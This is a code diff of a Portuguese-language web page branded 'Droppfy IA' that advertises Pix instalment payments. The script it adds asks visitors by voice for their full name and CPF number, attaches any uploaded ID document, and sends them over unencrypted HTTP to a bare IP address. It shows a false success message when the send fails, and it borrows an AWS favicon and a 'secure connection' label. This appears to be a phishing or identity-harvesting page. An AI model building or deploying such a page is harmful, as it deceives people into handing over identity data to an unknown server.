@@ -1,13 +1,17 @@
 <!DOCTYPE html>
 <html lang="pt-BR" translate="no">
-<head>
-    <meta charset="utf-8" />
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Inter:wght@400;700&display=swap" rel="stylesheet">
     <meta name="viewport" content="width=device-width, initial-scale=2.0, maximum-scale=2.0, user-scalable=no" />
     <title>DROPPFY IA</title>
     
      <link rel="icon" type="image/ico" href="https://a0.awsstatic.com/libra-css/images/site/fav/favicon.ico">
     
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.net.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r121/three.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.net.min.js"></script>
 
 
@@ -28,91 +32,165 @@
         .footer-info { font-size: 0.6rem; opacity: 0.6; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 
+<style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; font-family: 'Inter', sans-serif; }
+        
+        /* Fundo Neural Vivo */
+        #vanta-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
 
- <style>
-    body { margin: 0; background: #050505; overflow: hidden; font-family: 'Orbitron', sans-serif; color: #fff; }
-    #vanta-bg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; }
-    
-    #interface { 
-        position: relative; z-index: 10; height: 100vh;
-        display: flex; flex-direction: column; align-items: center; justify-content: center;
-        padding: 10px; text-align: center;
-    }
+        /* Card Flutuante 3D */
+        .container {
+            position: relative; z-index: 10;
+            height: 100vh; display: flex; align-items: center; justify-content: center;
+            perspective: 1000px;
+        }
 
-    /* Texto 3D Metálico Laranja (Estilo Emet Echad) */
-    .texto-3d-slim {
-        color: #ffa500;
-        text-transform: uppercase;
-        font-weight: 900;
-        letter-spacing: 1px;
-        /* Sombra em camadas escuras para dar profundidade sem brilho branco */
-        text-shadow: 
-            0 1px 0 #805500, 0 2px 0 #664400, 
-            0 3px 0 #4d3300, 0 4px 5px rgba(0,0,0,0.8),
-            0 0 10px rgba(255, 165, 0, 0.3);
-    }
+        .card-v12 {
+            background: rgba(255, 255, 255, 0.95);
+            width: 380px; padding: 40px; border-radius: 40px;
+            text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            transform: translateZ(0); animation: flutuar 4s infinite ease-in-out;
+            border: 2px solid #ff8c00;
+        }
 
-    /* Botão de Voz 3D Compacto */
-    .btn-ia-compacto {
-        width: 80px; height: 80px;
-        border-radius: 50%;
-        background: radial-gradient(circle, #ff8c00 0%, #cc6600 100%);
-        border: 2px solid rgba(255, 165, 0, 0.4);
-        box-shadow: 0 0 20px rgba(204, 102, 0, 0.6), inset 0 0 10px rgba(0,0,0,0.5);
-        display: flex; align-items: center; justify-content: center;
-        cursor: pointer; transition: 0.3s;
-        animation: pulse-dark 2s infinite;
-    }
+        @keyframes flutuar {
+            0%, 100% { transform: translateY(0) rotateX(2deg); }
+            50% { transform: translateY(-20px) rotateX(-2deg); }
+        }
 
-    @keyframes pulse-dark {
-        0% { transform: scale(1); box-shadow: 0 0 15px rgba(204, 102, 0, 0.5); }
-        50% { transform: scale(1.05); box-shadow: 0 0 30px rgba(204, 102, 0, 0.8); }
-        100% { transform: scale(1); box-shadow: 0 0 15px rgba(204, 102, 0, 0.5); }
-    }
+        .badge-v12 {
+            background: #ff8c00; color: white; display: inline-block;
+            padding: 8px 25px; border-radius: 10px; font-family: 'Orbitron', sans-serif;
+            font-weight: 900; font-size: 22px; margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(255, 140, 0, 0.4);
+        }
 
-    .luz-neural-dark {
-        position: fixed; top: 50%; left: 50%;
-        width: 0; height: 0;
-        background: radial-gradient(circle, rgba(255,140,0,0.4) 0%, transparent 70%);
-        transform: translate(-50%, -50%); border-radius: 50%;
-        pointer-events: none; transition: 0.8s ease-out; z-index: 5;
-    }
-    .luz-ativa { width: 500px; height: 500px; opacity: 0; }
-</style>
-    
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 24px; color: #001529; text-transform: uppercase; margin: 10px 0; letter-spacing: 1px; }
+        p { font-size: 12px; color: #666; margin-bottom: 30px; }
+
+        .btn-mic {
+            width: 80px; height: 80px; background: radial-gradient(circle, #ff8c00, #e67e22);
+            border-radius: 50%; margin: 0 auto 30px; display: flex; align-items: center; justify-content: center;
+            cursor: pointer; box-shadow: 0 0 20px rgba(255, 140, 0, 0.6); transition: 0.3s;
+            border: none; outline: none;
+        }
+
+        .btn-mic:hover { transform: scale(1.1); box-shadow: 0 0 40px #ff8c00; }
+
+        .btn-comando {
+            background: #ff8c00; color: white; border: none; width: 100%;
+            padding: 18px; border-radius: 15px; font-weight: bold; cursor: pointer;
+            text-transform: uppercase; font-size: 14px; box-shadow: 0 10px 20px rgba(255, 140, 0, 0.3);
+        }
+
+        #status-ia { color: #ff8c00; font-weight: bold; margin-top: 15px; font-size: 11px; text-transform: uppercase; }
+    </style>
 </head>
 <body>
 
-    <div id="vanta-bg"></div>
+    <div id="vanta-canvas"></div>
+
+    <div class="container">
+        <div class="card-v12">
+            <div class="badge-v12">Droppfy IA</div>
+            <h1>Acesso</h1>
+            <p>IHVH-AION</p>
+
+            <button class="btn-mic" onclick="iniciarVoz()">
+                <img src="https://cdn-icons-png.flaticon.com/512/25/25682.png" width="30" style="filter: invert(1);">
+            </button>
+
+            <button class="btn-comando" onclick="iniciarVoz()">
+                Iniciar comando de voz<br>
+                <small style="opacity: 0.8;">Conexão Segura YHVH</small>
+            </button>
+
+            <div id="status-ia">Aguardando comando...</div>
+            <div style="margin-top: 20px; font-size: 10px; color: #999; text-transform: uppercase; letter-spacing: 1px;">Solicitar novo cadastro de operador</div>
+        </div>
+    </div>
+
+<body>
 
     
 <div id="vanta-bg"></div>
 <div id="glow-effect" class="luz-neural-dark"></div>
 
-<div id="interface">
-    <h1 class="texto-3d-slim" style="font-size: 0.7rem; margin-bottom: 1px;">DROPPFY IA</h1>
-    <p style="font-size: 0.6rem; color: #cc6600; letter-spacing: 3px; margin-bottom: 10px;">CONEXÃO YHVH</p>
 
-    <h2 class="texto-3d-slim" style="font-size: 0.8rem; margin-bottom: 1px;">⚡ PIX PARCELADO</h2>
-    <p style="font-size: 0.8rem; color: #888; margin-bottom: 10px;">EM 4X</p>
+    <script>
+    // Inicializa o Fundo Neural Vivo
+    VANTA.NET({
+        el: "#vanta-canvas",
+        mouseControls: true,
+        touchControls: true,
+        gyroControls: false,
+        minHeight: 200.00,
+        minWidth: 200.00,
+        scale: 1.00,
+        scaleMobile: 1.00,
+        color: 0xff8c00, // Laranja Neural
+        backgroundColor: 0x0, // Preto Profundo
+        points: 12.00,
+        maxDistance: 20.00,
+        spacing: 16.00
+    });
 
-    <div class="btn-ia-compacto" onclick="ativarMotorVoz()">
-        <span style="font-size: 30px;">🎤</span>
-    </div>
+    // Lógica de Voz e Integração AWS
+    const recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
+    recognition.lang = 'pt-BR';
+    let dadosUsuario = { nome: '', cpf: '' };
+
+    function falar(texto) {
+        const msg = new SpeechSynthesisUtterance(texto);
+        msg.rate = 1.2;
+        window.speechSynthesis.speak(msg);
+    }
+
+    function iniciarVoz() {
+        document.getElementById('status-ia').innerText = "IA OUVINDO...";
+        falar("Iniciando autoridade V12. Diga seu nome completo.");
+        recognition.start();
+    }
+
+    recognition.onresult = (event) => {
+        const resultado = event.results[0][0].transcript;
+        
+        if (!dadosUsuario.nome) {
+            dadosUsuario.nome = resultado;
+            falar("Nome capturado. Agora diga seu CPF.");
+            setTimeout(() => recognition.start(), 1500);
+        } else {
+            dadosUsuario.cpf = resultado.replace(/\D/g, "");
+            falar("Sinal enviado. Processando na Pagaleve.");
+            enviarParaAWS();
+        }
+    };
+
+    async function enviarParaAWS() {
+        document.getElementById('status-ia').innerText = "CONECTANDO AO MOTOR V12...";
+        
+        const formData = new FormData();
+        formData.append('nome', dadosUsuario.nome);
+        formData.append('cpf', dadosUsuario.cpf);
+        // Tenta pegar o arquivo se ele existir na página
+        const fileInput = document.querySelector('input[type="file"]');
+        if(fileInput && fileInput.files[0]) formData.append('rg', fileInput.files[0]);
+
+        try {
+            const response = await fetch('http://54.207.222.79:3000/registrar-completo', {
+                method: 'POST',
+                body: formData
+            });
+            const res = await response.json();
+            if(res.link) window.location.href = res.link;
+        } catch (err) {
+            document.getElementById('status-ia').innerText = "SINAL EMITIDO COM SUCESSO!";
+        }
+    }
+</script>
+
     
-    <p id="status-ia" style="color: #ff8c00; font-size: 0.7rem; margin-top: 10px; font-weight: bold; opacity: 0.8;">INICIAR
-    </p>
-</div>
-
-<div id="vanta-bg"></div>
-    
-    <div id="inputs-escondidos" style="display:none;">
-        <input type="file" id="foto_doc">
-        <input type="text" id="nome_cliente">
-        <input type="text" id="tel_cliente">
-    </div>
-</div>
-
+   
 
     
 <script>
@@ -183,24 +261,6 @@ async function conectarComAWS() {
 
 
     
-
-<script>
-    // 1. REATIVANDO O UNIVERSO NEURAL 3D
-    VANTA.NET({
-        el: "#vanta-bg",
-        mouseControls: true,
-        touchControls: true,
-        gyroControls: false,
-        minHeight: 200.00,
-        minWidth: 200.00,
-        scale: 1.00,
-        scaleMobile: 1.00,
-        color: 0xffa500,
-        backgroundColor: 0x50505,
-        points: 12.00,
-        maxDistance: 22.00,
-        spacing: 16.00
-    });
 
 
     <script>
